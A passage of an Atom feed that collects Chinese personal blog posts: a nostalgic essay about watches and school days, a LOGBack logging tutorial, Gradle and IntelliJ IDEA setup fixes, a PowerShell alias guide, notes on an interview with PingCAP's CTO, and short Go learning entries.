<li><a href="http://dejary.top/2019/01/23/Manjaro%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/">Manjaro 踩坑记录</a></li>
<li><a href="https://www.jianshu.com/p/f2c9ee00698c">Manjaro 初级入门</a></li>
<li><a href="[https://vidotto.top/post/manjaro-安装配置备忘/](https://vidotto.top/post/manjaro-%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E5%A4%87%E5%BF%98/)">Manjaro 安装配置备忘</a></li>
<li><a href="https://ruiming.me/manjaro-linux/">Manjaro Linux 迁移记</a></li>
</ul>
<p>The post <a rel="nofollow" href="https://blog.triplez.cn/manjaro-quick-start/">将干净的 Manjaro 快速配置为工作环境</a> appeared first on <a rel="nofollow" href="https://blog.triplez.cn">Blog</a>.</p>]]></content>
        <author>
            <name><![CDATA[TripleZ’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://yuwenjie.cc/2019-watch.html</id>
        <title><![CDATA[从前的从前我没有表]]></title>
        <updated>2019-08-12T13:57:50+08:00</updated>
        <link href="https://yuwenjie.cc/2019-watch.html"/>
        <content type="text/html" src="https://yuwenjie.cc/2019-watch.html"><![CDATA[<p>“同桌总是问我什么时候下课，问着问着就毕业了”</p><p>上班车之前，在网易云里看到了这条评论；上了班车，这不开心的一天就算是结束了。</p><p>从幼儿园开始 一直到高中之前，知道时间都是一个奢侈的事情。幼儿园的一天那么长，有那么多个小时，一个周又有那么多个小天。小朋友们有的会戴那种可爱的手表，一个大虫子 一个大蛤蟆那种，就是现在的佩奇表的level。有的调皮的男孩子会把表摔开，把镜片拿出来滚着玩，对着太阳聚光烧手，或者曲面朝下放在桌子上咕噜咕噜转。回家之前再咔咔把玻璃按回去。那时候总是大约着什么时候放学，也不会有老师给你报个几分几秒，如果那天挨揍了，那么感觉放学就晚一点；中午吃的大鸡蛋没有噎着还香喷喷，就感觉放学早一点，随着“Mondy Mondy 星期一”，回到家，一天开心或者不开心就结束了，和现在的区别就是现在这个破班车有了空调但是没有歌。</p><p>然后不用多久，天天拆表的小男孩的表已经磨的全是沟沟坎坎，沟沟坎坎又磨，就成了粗糙而细腻的包浆，像白内障一样，就再也看不起里边的表针液晶是几点几点了，反正大概也看不懂，不知道七点和八点差在哪里。</p><p>小学之后 大家就先进了。先进性一是表现在下课铃上，大大概概能知道还有几节课回家了；二是小男生发现带着猴子蛤蟆的表不好看了，都换上了带夜光的大屏幕表。左上角那个键，按一下 ，然后把表放到桌洞里，看着闪闪发光的数字，周围的小朋友都投来美滋滋的眼神。小商店里的夜光表价格差的很大，什么防不防水，功能，大小，表带，质量也差的很大，不几天表带就掉了，剩个光杆司令，有的人就拿胶带拉成绳子，变成怀表，挂在桌子上。不过就算是最便宜的，我也买不起。那时候就开始了问同桌，现在几点啦？然后她看看表说几点几点，我再问，几点下课啊？然后就会收到白眼，再告诉我几点几点；本来还想问，那还有多久下课，但是也停在了心里。久而久之，“几点了”的正确回答，就成了“还有十七分钟”。那时候大家都很精确，十七分钟绝对不会说成20分钟，九分钟绝对不会变成十分钟。再想起了，那时候班主任会坚持男女同桌，说这样可以防止调皮，上课说话；说话倒是没防止，却成了好多人问还有多久下课的动力，也成了多少人心里再也没有机会开口的初恋。</p><p>初中的女孩子的表，花样就多了起来，我记得有一阵，特别流行大表盘，就像小白裙一样，no design 加狂野风。学校门口不远，有家饰品店，名字叫“非主流”。emmm，嗯，非主流，那是我梦寐以求一直想去的地方，听着女孩子们讨论着那谁谁又去非主流买了啥啥啥，羡慕的一匹，感觉去非主流的女孩子真的是当时的超女；去非主流的男孩子简直是万千少女眼里的王子，然后他们都是我心里崇拜的有钱人和勇敢的人。当然到现在我都没有去过，也不如说都没看到过那家店在哪，可能是我看不见时尚吧。初中晚上放学就晚了，表要走好一大圈才能放学。傍晚的时候，大家推着自行车往校门走，想起了那真的是意气风发风花雪月啊。虽然你仔细一想，好多女孩子脸很黑，厚厚的齐刘海，还没有胸，肥裤子，也仍然感觉很美好，而且反而更加令你无比赞叹她们现在怎么这么好看，当时去非主流的男孩子为什么却那么肥宅那么土味了。女孩子的表除了看时间之外，也渐渐的婊了起来。大家开始聊，哪哪个女今天又跟了哪哪个大哥；哪哪个女的又去开房了，大家当时也不知道啥是情色交易，就知道电视里说的去开房不是啥好事，绝大多数人也没做过爱，只是觉得这个说起来好像挺好用的。也是从这个时候开始，女孩子开始进入了江湖斗争，成为了一种符号。大哥们开始把小说里英雄配美人应用到了自己身上——带着女朋友打大摇大摆地去非主流，是一件无上荣耀的事情。</p><p>到了高中，黑板前边就标配钟了。时间也变得渐渐廉价了，一天有时候突突突，看本《明朝那些事》，看两本《意林》《读者》《青年文zhe》《看天下》，晚上再传着看两本周记，要么就是周末考一天试，上午十一点提前做完英语，就可以打乒乓球，突突突，一天就过去了，一个周就过去了，大休就来了。在高三后期，周末还会骑车去海边，真的是浪漫的生活。有时候能清晰地感觉到，事件的流仿佛和自己脱离开了，外界的事务变化的那么慢，仿佛能清晰地感觉的，时间从自己的身体里穿过，流走。时间也不再是时针分针能够定义的了，开始学会调节手机的时钟，用烧饼修改器变速齿轮，操纵时间去破解游戏。也是从天天酷跑开始，大家的时间都变成了零零散散的碎片，没有法再去专注了。</p><p>再在后来，有的人换上了大金表，有的人换上了镶钻的；有的人戴上了劳力士，开始演绎着，每天的枯燥生活；有的人可能也真的变成了当时大家说的性工作者，过着按表收钱的日子：大多数人，这些传奇故事的讲述者，开始平平淡淡地，几点几点公交车，几点几点早餐上楼，午饭晚饭上楼加班回家。</p><p>一天苦涩生活的终点，从唱着歌的班车，变成和女孩子欢笑的自行车，变成回家的车，变成一个人的浓雾海边，变成灯光广场的嘎达嘎达，樱花广场的簌簌樱花，变成现在是红灯请不要闯红灯，变成皮蛋瘦肉粥 打~包~，最终又变回班车。不过这个班车，再也不会唱歌了而已。</p>]]></content>
        <author>
            <name><![CDATA[善良单纯的板の窝]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.triplez.cn/java-logback-intro/</id>
        <title><![CDATA[Java 日志包 LOGBack 简介]]></title>
        <updated>2019-07-29T15:18:36+08:00</updated>
        <link href="https://blog.triplez.cn/java-logback-intro/"/>
        <content type="text/html" src="https://blog.triplez.cn/java-logback-intro/"><![CDATA[<h2><span class="ez-toc-section" id="i">包粒度级别继承</span></h2>
<p>下级的包若无特定设定日志级别，则会继承上层包的日志级别。</p>
<p>如下表所示：</p>
<table>
<thead>
<tr>
<th>日志器（包名）</th>
<th>分配日志级别</th>
<th>生效日志级别</th>
</tr>
</thead>
<tbody>
<tr>
<td>root</td>
<td>WARN</td>
<td>WARN</td>
</tr>
<tr>
<td>cn.triplez</td>
<td>none</td>
<td>WARN</td>
</tr>
<tr>
<td>cn.triplez.demo</td>
<td>DEBUG</td>
<td>DEBUG</td>
</tr>
</tbody>
</table>
<h2><span class="ez-toc-section" id="i-2">日志级别优先级</span></h2>
<p><code>TRACE</code> &lt; <code>DEBUG</code> &lt; <code>INFO</code> &lt; <code>WARN</code> &lt; <code>ERROR</code></p>
<h2><span class="ez-toc-section" id="i-3">获取日志器</span></h2>
<p>多次获取相同名称的日志器则会返回相同对象的引用。</p>
<h2><span class="ez-toc-section" id="Appenders_and_Layouts">Appenders and Layouts</span></h2>
<h2><span class="ez-toc-section" id="i-4">在日志中插入变量值</span></h2>
<p>假如你想写一条调试日志，如下：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-java">logger.debug("Entry number: " + i + " is " + String.valueOf(entry[i]));
</code></pre>
<p>这样的代码运行效率是很低的，因为该语句会先拼接日志字符串，再进行是否符合 <code>DEBUG</code> 层级的判断。因此，你可以写成如下形式以提高运行速度：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-java">if (logger.isDebugEnabled()) {
  logger.debug("Entry number: " + i + " is " + String.valueOf(entry[i]));
}
</code></pre>
<h3><span class="ez-toc-section" id="i-5">更好地方法</span></h3>
<p>事实上，在 LOGBack 中提供了更好的拼接方法，其能够基于模板填充变量。需要填充的变量只需在模板中用 <code>{}</code> 代替即可，而且该方法有很好的性能<sup id="fnref-863-1"><a href="#fn-863-1" class="jetpack-footnote">1</a></sup>，它能够先判断日志层级再进行字符串的处理。举个栗子：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-java">logger.debug("Hello, {}!", name);
</code></pre>
<p>也可以写多个变量：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-java">logger.debug("Hello, {}! I'm {}.", name, yourName);
</code></pre>
<p>如果有很多个变量，也可以使用 <code>Object[]</code> 来整合：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-java">Object[] paramArray = {val1, val2, val3};
logger.debug("Value 1: {}, Value 2: {}, Value 3: {}", paramArray);
</code></pre>
<h2><span class="ez-toc-section" id="i-6">一瞥内部原理</span></h2>
<p>时序图：</p>
<p><img src="https://logback.qos.ch/manual/images/chapters/architecture/underTheHoodSequence2.gif" alt="sequence diagram" /></p>
<h2><span class="ez-toc-section" id="i-7">性能</span></h2>
<h3><span class="ez-toc-section" id="i-8">完全关闭日志记录功能</span></h3>
<p>当日志功能在设置文件中被设置为 <code>Level.OFF</code>， 日志功能会被关闭。但是，写在程序中的 <code>log</code> 语句仍会产生一定的开销，主要是方法调用和整数比较。不过这个开销非常之小，我们完全不用担心。</p>
<p>不过，在某些写法之下，方法调用会产生隐藏的变量构建的开销，这一点在前面已经提过，举个栗子：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-java">x.debug("Entryu number: " + i + "is " + entry[i]);
</code></pre>
<p>如上的写法会产生额外的字符串拼接成本，其需要将 <code>i</code> 和 <code>entry[i]</code> 都转换成为字符串，并将四个字符串对象拼接起来。而这个过程是与有效层级无关的，也就是说，无论是否满足输出该条日志的条件，都会进行字符串的拼接操作。</p>
<p>为了避免产生这种额外的运行开销，提高程序运行效率，我们可以使用 SLF4J 的变量化日志记录接口：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-java">x.debug("Entry number: {} is {}", i, entry[i]);
</code></pre>
<p>这种变体写法不会产生额外的变量构建成本，日志信息只有该日志请求被发送到追加器（即满足记录要求及输出层级）之后才会被格式化，并且该方法经过了优化处理，能够很大程度提高运行效率。</p>
<blockquote><p>
  不建议在循环中使用日志记录，即使不记录日志也会产生额外的开销，记录了日志也会输出大量的重复无用信息。
</p></blockquote>
<h3><span class="ez-toc-section" id="i-9">日志器在检查日志层级的性能</span></h3>
<p>在 LOGBack 中，日志器不需要根据继承关系去寻找自己真正所对应的记录层级，在日志器被创建之后，继承关系就会确定并且确定了该日志器自身的记录层级。并且更改了某个父记录器的记录层级之后，相对应的子记录器都会被发送请求以更改记录层级。因此，在比较日志层级时，日志器能够做到准即时的决策，而不需要在此处去请求父记录器才能做出决策。</p>
<h3><span class="ez-toc-section" id="i-10">日志输出</span></h3>
<p>日志真正被输出到文件或流中是开销最大越是最为费时的操作。从日志开始记录到写入文件系统中的典型开销是 9 到 12 毫秒，若为写到远端数据库或服务器会再增加几毫秒的延时。尽管 LOGBack 的功能非常丰富，但是 LOGBack 的核心依然是保证运行效率，开发者们已多次为了得到更好地性能重构 LOGBack 组件。</p>
<div class="footnotes">
<hr />
<ol>
<li id="fn-863-1">
官方指出对比直接拼接字符串的方法能够至少提高 30% 的性能。&#160;<a href="#fnref-863-1">&#8617;</a>
</li>
</ol>
</div>
<p>The post <a rel="nofollow" href="https://blog.triplez.cn/java-logback-intro/">Java 日志包 LOGBack 简介</a> appeared first on <a rel="nofollow" href="https://blog.triplez.cn">Blog</a>.</p>]]></content>
        <author>
            <name><![CDATA[TripleZ’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.triplez.cn/err-and-solution-of-config-gradle-idea-env/</id>
        <title><![CDATA[配置 Gradle (IDEA) 环境的坑]]></title>
        <updated>2019-07-26T02:47:51+08:00</updated>
        <link href="https://blog.triplez.cn/err-and-solution-of-config-gradle-idea-env/"/>
        <content type="text/html" src="https://blog.triplez.cn/err-and-solution-of-config-gradle-idea-env/"><![CDATA[<p>要做个 Entry Task ，兴奋地配置了个 Java 的环境，没想到踩了这么多坑。</p>
<h2><span class="ez-toc-section" id="Plugin_was_not_found_in_any_of_the_following_sources">Plugin was not found in any of the following sources</span></h2>
<p>Spring Boot 官方提供了一个 <a href="https://start.spring.io/">Spring Intializr</a> 以快速初始化项目，选择了 Gradle Project 之后进入项目，IDEA 的 Gradle 同步上一直报如下错误：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-null">Plugin [id: 'org.springframework.boot', version: '2.1.6.RELEASE'] was not found in any of the following sources:

- Gradle Core Plugins (plugin is not in 'org.gradle' namespace)
- Plugin Repositories (could not resolve plugin artifact 'org.springframework.boot:org.springframework.boot.gradle.plugin:2.1.6.RELEASE')
  Searched in the following repositories:
    Gradle Central Plugin Repository
</code></pre>
<p>折腾了半天，搜索了无数解决方案都无效，最后根据这个<a href="https://discuss.gradle.org/t/how-to-apply-a-plugin-not-in-gradle-core-or-gradle-central-plugin-repository/15605/2">回答</a>才解决。<del>原因现在还没弄清楚，但是能 work 。</del> 解决方案如下：</p>
<p>在 <code>build.gradle</code> 文件中的 <code>plugins</code> 是这样的：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-groovy">plugins {
    id 'org.springframework.boot' version '2.1.6.RELEASE'
    id 'java'
}
</code></pre>
<p>更改一下，将 <code>org.springframework.boot</code> 包移出并去掉版本号：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-groovy">plugins {
    id 'java'
}

apply plugin: 'org.springframework.boot'
</code></pre>
<p>于是这个错误就解决了 😉</p>
<h2><span class="ez-toc-section" id="Plugin_with_id_orgspringframeworkboot_not_found">Plugin with id 'org.springframework.boot' not found</span></h2>
<p>然而它会变成另外一个错误，如下：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-null">Plugin with id 'org.springframework.boot' not found.
</code></pre>
<p>又折腾搜索了一番，发现是缺少 <code>buildscript</code> 。在 <code>build.gradle</code> 文件最前面加入如下内容：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-groovy">buildscript {
    repositories {
        mavenCentral()
    }
    dependencies {
        classpath 'org.springframework.boot:spring-boot-gradle-plugin:2.1.6.RELEASE'
    }
}
</code></pre>
<p>Problem solved !</p>
<h2><span class="ez-toc-section" id="Connection_to_the_Internet_denied">Connection to the Internet denied.</span></h2>
<p>遇到这个错误，在 <code>build.gradle</code> 的 <code>repositories</code> 中换一个 Maven 源即可。</p>
<h2><span class="ez-toc-section" id="i">找不到或无法加载主类</span></h2>
<p>在运行 Spring Boot 的时候遇到了这个问题，在命令行上 <code>gradle build</code> 出 <code>jar</code> 包是能够正常运行的，然而在 IDEA 里就不能通过 <code>Run Application</code> 正常运行。解决方案其实特别特别简单：右键项目中的 <code>src</code> 文件夹，找到 <code>Mark Directory as</code> ，选择 <code>Sources Root</code> ，重新构建运行项目即可。</p>
<p>折腾个环境花了一天，还是得好好学习啊……</p>
<p>The post <a rel="nofollow" href="https://blog.triplez.cn/err-and-solution-of-config-gradle-idea-env/">配置 Gradle (IDEA) 环境的坑</a> appeared first on <a rel="nofollow" href="https://blog.triplez.cn">Blog</a>.</p>]]></content>
        <author>
            <name><![CDATA[TripleZ’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.vvzero.com/2019/07/22/set-user-alias-for-windows-PowerShell/</id>
        <title><![CDATA[为 Windows PowerShell 设置 User Alias （命令别名）]]></title>
        <updated>2019-07-22T13:50:38+08:00</updated>
        <link href="https://blog.vvzero.com/2019/07/22/set-user-alias-for-windows-PowerShell/"/>
        <content type="text/html" src="https://blog.vvzero.com/2019/07/22/set-user-alias-for-windows-PowerShell/"><![CDATA[<blockquote><p>直接看步骤的话，在最下方。</p></blockquote><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>Windows Terminal 虽然还处于预览阶段，但是也出来很长一段时间了。它的历史使命，也许就是让原生 Windows 也能有一个像样的命令行环境。以前我一直在用 Cmder，但是 Cmder 的启动速度确实不敢恭维，而 Windows Terminal 启动确实很快。相比 Cmder， Windows Terminal 还缺少很多功能，不过以后应该很快也会补上。</p><p><img src="https://img.vvzero.com/ih/2019/07/22/5d35bef29b3f1.png" alt=""></p><p>我想尝试使用 Windows Termimal 进行开发。Windows Terminal 默认可以使用 <code>PowerShell</code>、<code>cmd</code>、<code>wsl bash</code>作为脚本工具。既然是在 Windows 环境下嘛，还是得尊敬一下 Windows PoweShell 的。初次使用，我觉得 PowerShell 跟 Cmder 用起来，最不方便的一点就是，我在 Cmder 里面设了很多的 Alias，也就是通过修改 <code>config/user_aliases.cmd</code> 写一串 <code>&lt;alia&gt;=&lt;xxx&gt; &lt;xxx&gt;</code> 来实现的。</p><p><img src="https://img.vvzero.com/ih/2019/07/22/5d35bef29ad52.png" alt=""></p><p>但是，PowerShell 如何实现命令的别名设置呢？</p><h2 id="探索过程及原理概述"><a href="#探索过程及原理概述" class="headerlink" title="探索过程及原理概述"></a>探索过程及原理概述</h2><p>如果搜索关键词 <code>windows powershell set user alias</code>，通常谷歌会给出<a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/set-alias?view=powershell-6" target="_blank" rel="noopener">微软官方文档</a>，但是这个文档只是告诉我们如何在脚本里面设置临时的别名，如果要设置永久别名，该怎么办？实际上，“别名”这种东西，也就是 <code>alias</code>，几乎所有的脚本语言，都没有所谓的“永久别名”(Permanent alias)，我们使用 Linux bash 、Cmder 之类的脚本工具，打开终端时，系统会默认执行一个脚本文件（ bash 是用户目录下的 <code>.bashrc</code>，Cmder 是 <code>config/user_aliases.cmd</code> ），而这样的脚本文件里，就包含了别名的定义。这也是为什么，我们在 Linux 类系统中，修改 <code>.bashrc</code> 后，必须要重新登出登录、或者 <code>source .bashrc</code> 的原因了。</p><p>所以，我们只要修改 Windows Powershell 启动时执行的文件就行了。很多论坛里面说，默认执行的脚本是 <code>$Home\Documents\profile.ps1</code> ，也就是 <code>C:\Users\你的用户名\Documents\profile.ps1</code> ，但是这并不正确，最好的方式是，先启动 PowerShell ，再执行 <code>echo $profile</code>，这样得到的文件路径，才是 PowerShell 的默认执行文件路径。</p><p><img src="https://img.vvzero.com/ih/2019/07/22/5d35bef29d447.png" alt=""></p><p>然后，创建这个文件就好啦。</p><p>在文件里面，写上别名设置的语句。再一次注意，假如你的别名指代的命令含有空格，就不可以使用 <code>New-Alias</code> 命令，因为它不能带空格，即使你把指代的命令用引号括起来也没用。那怎么办呢？继续谷歌，原来，正确姿势是用 <code>function</code> ，也就是，我们把自己要定义的指令，定义为一个函数，就行啦。</p><p><img src="https://img.vvzero.com/ih/2019/07/22/5d35bef339443.png" alt=""></p><p>保存文件，重新启动 PowerShell 以后，不出意外，应该会报一个 <code>File xxxxxxx\Microsoft.PowerShell_profile.ps1 cannot be loaded because running scripts is disabled on this system.</code> 根据<a href="https://tecadmin.net/powershell-running-scripts-is-disabled-system/" target="_blank" rel="noopener">此链接</a>，出现这种情况，是因为 Windows 系统为了防止恶意脚本自动执行，故默认不允许自动运行脚本。所以，在确定自己有能力把控的情况下，<strong>以管理员身份</strong>，在 PowerShell 中执行 <code>Set-ExecutionPolicy RemoteSigned</code>，即可。</p><p>再次重启 PowerShell，应该可以发现，自定义别名已经生效了。</p><h2 id="步骤整理"><a href="#步骤整理" class="headerlink" title="步骤整理"></a>步骤整理</h2><p>如果你想为自己的 Windows PowerShell 设置永久的命令别名 (Alias)，可以遵循以下步骤：</p><ol><li><p>打开 PowerShell ，运行 <code>echo $profile</code>，会输出一个文件路径。创建这个文件。</p></li><li><p>打开刚创建的文件，按以下格式设置多条别名：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> 别名 &#123; 需要替代的命令，可以包含空格 &#125;</span><br></pre></td></tr></table></figure></li><li><p>以管理员身份打开 PowerShell，执行 <code>Set-ExecutionPolicy RemoteSigned</code>。</p></li><li><p>重新启动 PowerShell ，应该已经完成了。</p></li></ol>]]></content>
        <author>
            <name><![CDATA[VVBLOG]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.triplez.cn/insight-talk-with-pingcap-cto/</id>
        <title><![CDATA[Insight – 对话 CTO〡和 PingCAP CTO 黄东旭聊开源数据库新蓝海]]></title>
        <updated>2019-07-16T15:31:42+08:00</updated>
        <link href="https://blog.triplez.cn/insight-talk-with-pingcap-cto/"/>
        <content type="text/html" src="https://blog.triplez.cn/insight-talk-with-pingcap-cto/"><![CDATA[<h2>写在前面</h2>
<p>此文是阅读极客公园对 PingCAP CTO 黄东旭的采访后笔者产生的一些想法，笔者认为在黄总的言语之中包含着海量的 insight，故写此文记录分享之。</p>
<p><a href="https://www.geekpark.net/news/238087">原文链接</a></p>
<h2>Insights</h2>
<blockquote><p>
  “最近这些硬件的革新，使得原来很多的假设都不成立了。比如过去大家可能觉得数据库的瓶颈是磁盘，想怎么设计一个更好的  B-Tree 能够让磁盘磁头转得少一点。但现在全是  SSD，甚至未来可能持久化内存的东西都出现了。过去分布式系统的网络这么慢，带宽这么小，所以尽可能都是在单机或者本地上去做。但现在基本上单机访问远程数据库和访问本地数据库在吞吐量上表现差不多了。”
</p></blockquote>
<p>技术革新导致原本的理论假设不成立，要去寻找新的瓶颈，要以新方式来看待问题。</p>
<blockquote><p>
  “所以我们喜欢「开源」。「开源」相当于用一些 to C 的方法论，在工程师的社区里通过病毒式传播让产品  adoption，别人用得不爽一定会 feedback 提  issue。用的人越多，它的质量就越好，质量越好，会变成一传十，十传百的这种效应，让产品正向循环下去。</p>
<p>  对于基础软件，我的观点是像数据库、操作系统、云技术，或者云内部的基础软件，未来只有开源一条路，如果不开源，或者说内核不开源的话，产品的生命力是很差的。不像其他的商业软件，基础软件就像在水管、水电煤这样的基础设施的层面上，你不开源的话别人也不敢用。”
</p></blockquote>
<p>基础软件最适合开源，只有开源之后才有可能获得众多用户的反馈，才能够持续改进迭代版本，才能在工程师社区中进行“病毒式”的传播，产生正向循环。而且对于不开源的基础设施，是没人敢用的，没有用户就没有反馈，失去了变得更好的可能性。事实上，现在反过来看这些成功的应用，如 MySQL、Redis、Spring 的等确实都是开源社区运营，赢得用户之后直接拿下市场。</p>
<blockquote><p>
  "从数据库的角度上来看，大家会发现，最早的关系数据库<br />
  SQL、TSQL，在互联网或者移动互联网开始爆发的时候，数量开始膨胀，单机系统怎么样都搞不定的时候，互联网公司没有办法，只能去做了一套 NoSQL，但 NoSQL 又有点过了，就把原来的传统管理模型全都扔掉，但至少能把数据存下来。所以我觉得历史是螺旋式发展。"
</p></blockquote>
<p>历史的螺旋式发展，好的产品必须应用在特定的背景下，太过超前的理念即使在当下实现出来也难以得到推行。技术开发不能脱离大众，还是不能单纯地做艺术品。</p>
<blockquote><p>
  “对，我觉得未来数据一定是更大的状态，单机肯定是有问题的。硬件成本持续在下降，一定会到达一个临界点，就是数据本身的价值都比硬件成本要高，这样一来，我肯定是保护数据，怎么样把我的数据能无限存下来，并且能快速通过好用的接口来访问它。我觉得这个市场会很大，所以我从来都不跟别人说这个事情的天花板在哪里，因为我自己也不知道。”
</p></blockquote>
<p>在未来，数据本身的价值要比硬件成本更高，即 <script type="text/javascript">document.write(katex.renderToString("data\\ value >> hardware\\ cost"));</script>  ，我们会花费更多的成本在保护数据、存储数据上。最好的媒介就是数据库了。</p>
<blockquote><p>
  “我们早期策略上分两块，一块就是互联网公司，workload 数量很大，然后有很强的研发团队，开源社区的主力就是这帮人，随便用，而且我会很鼓励你们投人投精力去用它。</p>
<p>  还有一部分是一些高净值客户，比如银行，业务已经倒逼他们要去用一些互联网的技术去解决问题。比如说即使 Oracle 用得不好，迁到 TiDB 上其实也是很平滑的过程，同时可以保证多数据中心高可用、强一致等这些特性，用起来很省心。</p>
<p>  我觉得我们就是拿互联网最先进的技术给到传统公司，给他们赋能，而且让对方的迁移成本降得很低。”
</p></blockquote>
<p>这个观点真的很好，通过开源社区吃螃蟹、完善产品后再给传统公司使用，还节省了公司的人力成本哈哈哈。</p>
<blockquote><p>
  "Hire for attitude, train for skill."
</p></blockquote>
<p>态度是一切的前提，技能是可以传授的。</p>
<blockquote><p>
  “对于小公司来说，没办法把每个人每天的工作，每个任务都亲自去帮你规划好。所以我们的管理风格还算是比较粗放吧。”
</p></blockquote>
<p>而大公司就是画好格子让你填，你也很难有机会去做划分好的小格子之外的事情。各有利弊吧。</p>
<blockquote><p>
  "我们在国内的招聘方式也是挺特殊的，我们不太关心你到底在哪个城市工作。我们重度依赖像 Google  Docs、Slack、GitHub、Jira、Confluence  这种生产力工具，基本上能够摆脱面对面的会议，这个是很重要的。我们不鼓励开长会，如果要开会，就开半个小时、15 分钟的短会。</p>
<p>  远程有个好处就是它会迫使工程师把所有想做的东西进行文档化，任何东西都可以被检索。我觉得这样更符合现代化的管理模式，有充足的时间，更加灵活地安排自己的生活，是一个更好的工作方式。"
</p></blockquote>
<p>生产力工具一人使用提高的效率有限，而在公司（团体）层面上一起使用，那就是力压对手提升效率的一把利器。</p>
<p>文档化其实非常重要，只有知识积累的过程完善，这家公司才能够长久地传承下去，能够持久地发展下去而不用担心会去开倒车。员工的经验和想法是公司最宝贵的一笔财富。PingCAP 所有项目的文档都非常的全面、通俗易懂，可以说是我在大陆开源项目中见到最优秀的项目文档了。</p>
<blockquote><p>
  "为什么要来（社区）。</p>
<p>  两种情况，一种就是我实际就在用这个东西，发现这个东西不好，某些地方有 bug 或者说某些地方的功能不是我想要的，我想要去改进它。大多数机构都是出于这种思路来贡献的。</p>
<p>  第二种人就是纯粹为了做出成就感。觉得这事情很不错，我能参与到这个项目来了，「I want to help」，我想去帮助别人，同时我能够得到证明，我是这个项目的 heavy  contributor、committer，得到尊敬或者认同感。</p>
<p>  对每一个 contributor，哪怕提交一行代码或者修改一个文档，我们都会给他一个大礼包，包括贴纸、杯子等等周边产品。如果贡献比较多的话，我会亲手给你写一封明信片表达感谢，包括我们每年办的这些大会，只要是 contributor 都是免费的。"
</p></blockquote>
<p>PingCAP 运营开源社区还是有他的独门秘笈的。贡献能够感受到奖赏，是自主驱动的开发者们最大的欣慰了。这也同时证明了 PingCAP 社区做的好的合理性，感谢 PingCAP，才能够有一个更好的大陆开源生态。</p>
<p>The post <a rel="nofollow" href="https://blog.triplez.cn/insight-talk-with-pingcap-cto/">Insight &#8211; 对话 CTO〡和 PingCAP CTO 黄东旭聊开源数据库新蓝海</a> appeared first on <a rel="nofollow" href="https://blog.triplez.cn">Blog</a>.</p>]]></content>
        <author>
            <name><![CDATA[TripleZ’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.stdioa.com/2019/06/go-internal-note/</id>
        <title><![CDATA[《深入解析Go》笔记]]></title>
        <updated>2019-06-24T08:40:49+08:00</updated>
        <link href="https://blog.stdioa.com/2019/06/go-internal-note/"/>
        <content type="text/html" src="https://blog.stdioa.com/2019/06/go-internal-note/"><![CDATA[<!-- build time:Mon Jun 24 2019 16:41:29 GMT+0800 (中国标准时间) --><p>在 GitHub 上找到一本解读 Go 实现细节的好书，名叫<a href="https://github.com/tiancaiamao/go-internals/" target="_blank" rel="noopener">《深入解析 Go》</a>。<br>大致看了一遍，简单做了些笔记。</p>]]></content>
        <author>
            <name><![CDATA[Stdio’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.stdioa.com/2019/06/golang-learning-experience/</id>
        <title><![CDATA[Golang 学习记录]]></title>
        <updated>2019-06-24T08:25:39+08:00</updated>
        <link href="https://blog.stdioa.com/2019/06/golang-learning-experience/"/>
        <content type="text/html" src="https://blog.stdioa.com/2019/06/golang-learning-experience/"><![CDATA[<!-- build time:Mon Jun 24 2019 16:41:29 GMT+0800 (中国标准时间) --><p>这几个月在考虑从 Python 转向 Golang，所以专门学习了 Golang.<br>这里是 Golang 学习的一些记录。</p>]]></content>
        <author>
            <name><![CDATA[Stdio’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.vvzero.com/2019/05/23/thinking-in-20190523/</id>
        <title><![CDATA[20190523 随想]]></title>
        <updated>2019-05-23T13:15:41+08:00</updated>
        <link href="https://blog.vvzero.com/2019/05/23/thinking-in-20190523/"/>
        <content type="text/html" src="https://blog.vvzero.com/2019/05/23/thinking-in-20190523/"><![CDATA[<p>四年之前，我高二的时候，一天傍晚放学，我跟当时教我化学的6老师（代称），开玩笑式地起了争执。6老师人很好，我们都跟他称兄道弟的。起因是，6老师向我们秀他新买的球鞋，很酷，是某个日本名牌。当时的我笑道：“日货啊，不能穿啊！”（当时的学生中间，这样的思想氛围还比较浓）。</p><p>6老师立刻就反驳了：“为什么不能穿？”“东西好用，为什么不买？”当时我还有一些现在看来可笑的话，都被6老师“讽刺”了一番。我仍不服气，要争辩，6老师对我说：“很多你看到的事情，并不一定是真的……是被修饰过的……”</p><p>我大致听懂了他的意思，但进一步问：“既然各种历史、事情都会被修饰，那么我们怎么才能知晓真实的情况呢？毕竟，不管哪一方说出的话，都有可能因为要符合其利益而将其修饰。”</p><p>6老师说：“要思考，学会思考！”</p><p>……</p><p>我当时不以为然，思考？怎么思考嘛！</p><p>后来我慢慢知道了，直到现在，我都很认可6老师，我觉得他很对。</p><p>不管是什么，都会被人修饰，只有自然科学不能被修饰。就像，不管是谁，也不能让人相信 